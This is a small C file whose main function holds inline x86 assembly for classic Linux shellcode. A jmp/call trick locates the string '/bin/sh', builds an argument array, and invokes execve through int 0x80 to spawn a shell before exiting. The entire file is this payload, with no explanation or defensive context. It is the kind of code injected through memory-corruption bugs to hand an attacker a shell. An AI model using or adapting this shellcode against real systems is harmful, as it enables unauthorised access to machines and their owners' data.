void main()
{
__asm__(
".intel_syntax\n\t"
"	jmp 0x2a\n\t"
"	pop esi\n\t"
"	mov DWORD [esi+0x8], esi\n\t"
"	mov BYTE [esi+0x7], 0x0\n\t"
"	mov DWORD [esi+0xc], 0x0\n\t"
"	mov eax, 0xb\n\t"
"	mov ebx, esi\n\t"
"	lea ecx, [esi+0x8]\n\t"
"	lea edx, [esi+0xc]\n\t"
"	int 0x80\n\t"
"	mov eax, 0x1\n\t"
"	mov ebx, 0x0\n\t"
"	int 0x80\n\t"
"	call -0x2f\n\t"
"db \"/bin/sh\"\n\t"
);
}
